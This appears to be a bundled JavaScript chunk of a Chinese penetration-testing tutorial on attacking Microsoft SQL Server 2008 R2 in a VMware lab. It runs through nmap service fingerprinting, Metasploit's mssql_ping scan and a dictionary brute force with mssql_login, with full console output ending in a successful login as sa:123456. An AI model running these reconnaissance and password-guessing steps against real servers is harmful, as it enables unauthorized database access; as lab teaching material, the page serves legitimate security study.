(window.webpackJsonp=window.webpackJsonp||[]).push([[231],{686:function(s,n,a){"use strict";a.r(n);var e=a(24),r=Object(e.a)({},(function(){var s=this,n=s.$createElement,a=s._self._c||n;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h1",{attrs:{id:"metasploit渗透mssql"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#metasploit渗透mssql"}},[s._v("#")]),s._v(" Metasploit渗透MSSQL")]),s._v(" "),a("p",[s._v("攻击机 kali 192.168.109.137")]),s._v(" "),a("p",[s._v("靶机 Win7_x64 192.168.109.139")]),s._v(" "),a("p",[s._v("数据库 MSSQL 2008 R2")]),s._v(" "),a("p",[s._v("MSSQL运行在TCP的1433端口以及UDP的1434端口")]),s._v(" "),a("h2",{attrs:{id:"使用nmap对mssql进行踩点"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#使用nmap对mssql进行踩点"}},[s._v("#")]),s._v(" 使用NMAP对MSSQL进行踩点")]),s._v(" "),a("p",[s._v("这里，我们使用Metasploit自带的db_nmap插件")]),s._v(" "),a("p",[a("strong",[s._v("首先我们对目标的1433端口进行扫描")])]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("db_nmap -sV -p 1433 192.168.109.139\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("具体操作情况如下：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("msf > db_nmap -sV -p 1433 192.168.109.139\n[*] Nmap: Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-18 09:56 CST\n[*] Nmap: Nmap scan report for 192.168.109.139\n[*] Nmap: Host is up (0.00035s latency).\n[*] Nmap: PORT     STATE SERVICE  VERSION\n[*] Nmap: 1433/tcp open  ms-sql-s Microsoft SQL Server 2008 R2 10.50.4000; SP2\n[*] Nmap: MAC Address: 00:0C:29:4A:EB:E0 (VMware)\n[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 6.54 seconds\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br")])]),a("p",[s._v("可以看到输出了MSSQL的一些信息。")]),s._v(" "),a("p",[a("strong",[s._v("扫描1434端口")])]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("db_nmap -sU -sV -p 1434 192.168.109.139\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("具体操作情况如下：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("msf > db_nmap -sU -sV -p 1434 192.168.109.139\n[*] Nmap: Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-18 09:57 CST\n[*] Nmap: Nmap scan report for 192.168.109.139\n[*] Nmap: Host is up (0.00032s latency).\n[*] Nmap: PORT     STATE SERVICE  VERSION\n[*] Nmap: 1434/udp open  ms-sql-m Microsoft SQL Server 10.50.4000.0 (ServerName: LIUYAZHUANG-PC; TCPPort: 1433)\n[*] Nmap: MAC Address: 00:0C:29:4A:EB:E0 (VMware)\n[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 0.72 seconds\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br")])]),a("p",[a("strong",[s._v("使用内置的NMap脚本获得一些关于目标数据库的附加信息")])]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("db_nmap -sU --script=ms-sql-info -p 1434 192.168.109.139\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("具体操作情况如下：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("msf > db_nmap -sU --script=ms-sql-info -p 1434 192.168.109.139\n[*] Nmap: Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-18 09:59 CST\n[*] Nmap: Nmap scan report for 192.168.109.139\n[*] Nmap: Host is up (0.00044s latency).\n[*] Nmap: PORT     STATE         SERVICE\n[*] Nmap: 1434/udp open|filtered ms-sql-m\n[*] Nmap: MAC Address: 00:0C:29:4A:EB:E0 (VMware)\n[*] Nmap: Host script results:\n[*] Nmap: | ms-sql-info:\n[*] Nmap: |   Windows server name: LIUYAZHUANG-PC\n[*] Nmap: |   192.168.109.139\\MSSQLSERVER:\n[*] Nmap: |     Instance name: MSSQLSERVER\n[*] Nmap: |     Version:\n[*] Nmap: |       name: Microsoft SQL Server 2008 R2 SP2\n[*] Nmap: |       number: 10.50.4000.00\n[*] Nmap: |       Product: Microsoft SQL Server 2008 R2\n[*] Nmap: |       Service pack level: SP2\n[*] Nmap: |       Post-SP patches applied: false\n[*] Nmap: |     TCP port: 1433\n[*] Nmap: |     Named pipe: \\\\192.168.109.139\\pipe\\sql\\query\n[*] Nmap: |_    Clustered: false\n[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 0.62 seconds\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br")])]),a("h2",{attrs:{id:"使用metasploit的模块进行扫描"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#使用metasploit的模块进行扫描"}},[s._v("#")]),s._v(" 使用Metasploit的模块进行扫描")]),s._v(" "),a("p",[s._v("这里，我们用到可Metasploit的mssql_ping")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("use auxiliary/scanner/mssql/mssql_ping\nshow options\nset RHOSTS 192.168.109.139\nrun\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("p",[s._v("具体操作情况如下：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('msf > use auxiliary/scanner/mssql/mssql_ping\nmsf auxiliary(scanner/mssql/mssql_ping) > show options\n\nModule options (auxiliary/scanner/mssql/mssql_ping):\n\n   Name                 Current Setting  Required  Description\n   ----                 ---------------  --------  -----------\n   PASSWORD                              no        The password for the specified username\n   RHOSTS                                yes       The target address range or CIDR identifier\n   TDSENCRYPTION        false            yes       Use TLS/SSL for TDS data "Force Encryption"\n   THREADS              1                yes       The number of concurrent threads\n   USERNAME             sa               no        The username to authenticate as\n   USE_WINDOWS_AUTHENT  false            yes       Use windows authentification (requires DOMAIN option set)\n\nmsf auxiliary(scanner/mssql/mssql_ping) > set RHOSTS 192.168.109.139\nRHOSTS => 192.168.109.139\nmsf auxiliary(scanner/mssql/mssql_ping) > \nmsf auxiliary(scanner/mssql/mssql_ping) > \nmsf auxiliary(scanner/mssql/mssql_ping) > run\n\n[*] 192.168.109.139:      - SQL Server information for 192.168.109.139:\n[+] 192.168.109.139:      -    ServerName      = LIUYAZHUANG-PC\n[+] 192.168.109.139:      -    InstanceName    = MSSQLSERVER\n[+] 192.168.109.139:      -    IsClustered     = No\n[+] 192.168.109.139:      -    Version         = 10.50.4000.0\n[+] 192.168.109.139:      -    tcp             = 1433\n[+] 192.168.109.139:      -    np              = \\\\LIUYAZHUANG-PC\\pipe\\sql\\query\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf auxiliary(scanner/mssql/mssql_ping) >\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br"),a("span",{staticClass:"line-number"},[s._v("24")]),a("br"),a("span",{staticClass:"line-number"},[s._v("25")]),a("br"),a("span",{staticClass:"line-number"},[s._v("26")]),a("br"),a("span",{staticClass:"line-number"},[s._v("27")]),a("br"),a("span",{staticClass:"line-number"},[s._v("28")]),a("br"),a("span",{staticClass:"line-number"},[s._v("29")]),a("br"),a("span",{staticClass:"line-number"},[s._v("30")]),a("br")])]),a("h2",{attrs:{id:"爆破mssql密码"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#爆破mssql密码"}},[s._v("#")]),s._v(" 爆破MSSQL密码")]),s._v(" "),a("p",[s._v("这里，用到的是Metasploit的mssql_login模块。")]),s._v(" "),a("p",[s._v("MSSQL的默认用户名为sa，默认密码为空，所以我们先测试下用户名为sa，密码为空的情况：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("use auxiliary/scanner/mssql/mssql_login\nshow options\nset RHOSTS 192.168.109.139\nrun\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("p",[s._v("具体操作情况如下：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("msf auxiliary(scanner/mssql/mssql_ping) > use auxiliary/scanner/mssql/mssql_login\nmsf auxiliary(scanner/mssql/mssql_login) > show options\n\nModule options (auxiliary/scanner/mssql/mssql_login):\n\n   Name                 Current Setting  Required  Description\n   ----                 ---------------  --------  -----------\n   BLANK_PASSWORDS      false            no        Try blank passwords for all users\n   BRUTEFORCE_SPEED     5                yes       How fast to bruteforce, from 0 to 5\n   DB_ALL_CREDS         false            no        Try each user/password couple stored in the current database\n   DB_ALL_PASS          false            no        Add all passwords in the current database to the list\n   DB_ALL_USERS         false            no        Add all users in the current database to the list\n   PASSWORD                              no        A specific password to authenticate with\n   PASS_FILE                             no        File containing passwords, one per line\n   RHOSTS                                yes       The target address range or CIDR identifier\n   RPORT                1433             yes       The target port (TCP)\n   STOP_ON_SUCCESS      false            yes       Stop guessing when a credential works for a host\n   TDSENCRYPTION        false            yes       Use TLS/SSL for TDS data \"Force Encryption\"\n   THREADS              1                yes       The number of concurrent threads\n   USERNAME                              no        A specific username to authenticate as\n   USERPASS_FILE                         no        File containing users and passwords separated by space, one pair per line\n   USER_AS_PASS         false            no        Try the username as the password for all users\n   USER_FILE                             no        File containing usernames, one per line\n   USE_WINDOWS_AUTHENT  false            yes       Use windows authentification (requires DOMAIN option set)\n   VERBOSE              true             yes       Whether to print output for all attempts\n\nmsf auxiliary(scanner/mssql/mssql_login) > set RHOSTS 192.168.109.139\nRHOSTS => 192.168.109.139\nmsf auxiliary(scanner/mssql/mssql_login) > run\n\n[*] 192.168.109.139:1433  - 192.168.109.139:1433 - MSSQL - Starting authentication scanner.\n[*] Error: 192.168.109.139: Metasploit::Framework::LoginScanner::Invalid Cred details can't be blank, Cred details can't be blank (Metasploit::Framework::LoginScanner::MSSQL)\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf auxiliary(scanner/mssql/mssql_login) > \n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br"),a("span",{staticClass:"line-number"},[s._v("24")]),a("br"),a("span",{staticClass:"line-number"},[s._v("25")]),a("br"),a("span",{staticClass:"line-number"},[s._v("26")]),a("br"),a("span",{staticClass:"line-number"},[s._v("27")]),a("br"),a("span",{staticClass:"line-number"},[s._v("28")]),a("br"),a("span",{staticClass:"line-number"},[s._v("29")]),a("br"),a("span",{staticClass:"line-number"},[s._v("30")]),a("br"),a("span",{staticClass:"line-number"},[s._v("31")]),a("br"),a("span",{staticClass:"line-number"},[s._v("32")]),a("br"),a("span",{staticClass:"line-number"},[s._v("33")]),a("br"),a("span",{staticClass:"line-number"},[s._v("34")]),a("br"),a("span",{staticClass:"line-number"},[s._v("35")]),a("br")])]),a("p",[s._v("可以看到登录失败，所以目标数据库的账户和密码不是默认的。")]),s._v(" "),a("p",[s._v("这里，我们继续构造目标数据库的用户名字典和密码字典，分别为：/root/user.txt 和 /root/pass.txt")]),s._v(" "),a("p",[s._v("接下来，我们使用用户名字典和密码字典爆破目标数据库")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("use auxiliary/scanner/mssql/mssql_login\nshow options\nset RHOSTS 192.168.109.139\nset USER_FILE /root/user.txt\nset PASS_FILE /root/pass.txt\nrun\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br")])]),a("p",[s._v("具体操作情况如下：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('msf > use auxiliary/scanner/mssql/mssql_login\nmsf auxiliary(scanner/mssql/mssql_login) > show options\n\nModule options (auxiliary/scanner/mssql/mssql_login):\n\n   Name                 Current Setting  Required  Description\n   ----                 ---------------  --------  -----------\n   BLANK_PASSWORDS      false            no        Try blank passwords for all users\n   BRUTEFORCE_SPEED     5                yes       How fast to bruteforce, from 0 to 5\n   DB_ALL_CREDS         false            no        Try each user/password couple stored in the current database\n   DB_ALL_PASS          false            no        Add all passwords in the current database to the list\n   DB_ALL_USERS         false            no        Add all users in the current database to the list\n   PASSWORD                              no        A specific password to authenticate with\n   PASS_FILE                             no        File containing passwords, one per line\n   RHOSTS               192.168.109.139  yes       The target address range or CIDR identifier\n   RPORT                1433             yes       The target port (TCP)\n   STOP_ON_SUCCESS      false            yes       Stop guessing when a credential works for a host\n   TDSENCRYPTION        false            yes       Use TLS/SSL for TDS data "Force Encryption"\n   THREADS              1                yes       The number of concurrent threads\n   USERNAME                              no        A specific username to authenticate as\n   USERPASS_FILE                         no        File containing users and passwords separated by space, one pair per line\n   USER_AS_PASS         false            no        Try the username as the password for all users\n   USER_FILE                             no        File containing usernames, one per line\n   USE_WINDOWS_AUTHENT  false            yes       Use windows authentification (requires DOMAIN option set)\n   VERBOSE              true             yes       Whether to print output for all attempts\n\nmsf auxiliary(scanner/mssql/mssql_login) > set USER_FILE /root/user.txt\nUSER_FILE => /root/user.txt\nmsf auxiliary(scanner/mssql/mssql_login) > set PASS_FILE /root/pass.txt\nPASS_FILE => /root/pass.txt\nmsf auxiliary(scanner/mssql/mssql_login) > run\n\n[*] 192.168.109.139:1433  - 192.168.109.139:1433 - MSSQL - Starting authentication scanner.\n[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\\xiaoming:liuyazhuang (Incorrect: )\n[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\\xiaoming:liu (Incorrect: )\n[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\\xiaoming:123456 (Incorrect: )\n[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\\xiaoming:3874378 (Incorrect: )\n[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\\xiaoming:Cdmn@339 (Incorrect: )\n[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\\xiaoming:@@@@@ (Incorrect: )\n[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\\xiaoming:1111 (Incorrect: )\n[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\\xiaoming:236726 (Incorrect: )\n[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\\xiaoming:23473748 (Incorrect: )\n[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\\xiaoming:223u4343 (Incorrect: )\n[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\\liuyazhuang:liuyazhuang (Incorrect: )\n[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\\liuyazhuang:liu (Incorrect: )\n[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\\liuyazhuang:123456 (Incorrect: )\n[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\\liuyazhuang:3874378 (Incorrect: )\n[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\\liuyazhuang:Cdmn@339 (Incorrect: )\n[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\\liuyazhuang:@@@@@ (Incorrect: )\n[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\\liuyazhuang:1111 (Incorrect: )\n[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\\liuyazhuang:236726 (Incorrect: )\n[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\\liuyazhuang:23473748 (Incorrect: )\n[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\\liuyazhuang:223u4343 (Incorrect: )\n[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\\jack:liuyazhuang (Incorrect: )\n[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\\jack:liu (Incorrect: )\n[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\\jack:123456 (Incorrect: )\n[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\\jack:3874378 (Incorrect: )\n[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\\jack:Cdmn@339 (Incorrect: )\n[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\\jack:@@@@@ (Incorrect: )\n[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\\jack:1111 (Incorrect: )\n[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\\jack:236726 (Incorrect: )\n[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\\jack:23473748 (Incorrect: )\n[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\\jack:223u4343 (Incorrect: )\n[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\\lyz:liuyazhuang (Incorrect: )\n[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\\lyz:liu (Incorrect: )\n[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\\lyz:123456 (Incorrect: )\n[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\\lyz:3874378 (Incorrect: )\n[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\\lyz:Cdmn@339 (Incorrect: )\n[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\\lyz:@@@@@ (Incorrect: )\n[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\\lyz:1111 (Incorrect: )\n[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\\lyz:236726 (Incorrect: )\n[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\\lyz:23473748 (Incorrect: )\n[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\\lyz:223u4343 (Incorrect: )\n[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\\administrator:liuyazhuang (Incorrect: )\n[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\\administrator:liu (Incorrect: )\n[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\\administrator:123456 (Incorrect: )\n[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\\administrator:3874378 (Incorrect: )\n[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\\administrator:Cdmn@339 (Incorrect: )\n[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\\administrator:@@@@@ (Incorrect: )\n[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\\administrator:1111 (Incorrect: )\n[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\\administrator:236726 (Incorrect: )\n[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\\administrator:23473748 (Incorrect: )\n[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\\administrator:223u4343 (Incorrect: )\n[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\\sa:liuyazhuang (Incorrect: )\n[-] 192.168.109.139:1433  - 192.168.109.139:1433 - LOGIN FAILED: WORKSTATION\\sa:liu (Incorrect: )\n[+] 192.168.109.139:1433  - 192.168.109.139:1433 - Login Successful: WORKSTATION\\sa:123456\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf auxiliary(scanner/mssql/mssql_login) > \n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br"),a("span",{staticClass:"line-number"},[s._v("24")]),a("br"),a("span",{staticClass:"line-number"},[s._v("25")]),a("br"),a("span",{staticClass:"line-number"},[s._v("26")]),a("br"),a("span",{staticClass:"line-number"},[s._v("27")]),a("br"),a("span",{staticClass:"line-number"},[s._v("28")]),a("br"),a("span",{staticClass:"line-number"},[s._v("29")]),a("br"),a("span",{staticClass:"line-number"},[s._v("30")]),a("br"),a("span",{staticClass:"line-number"},[s._v("31")])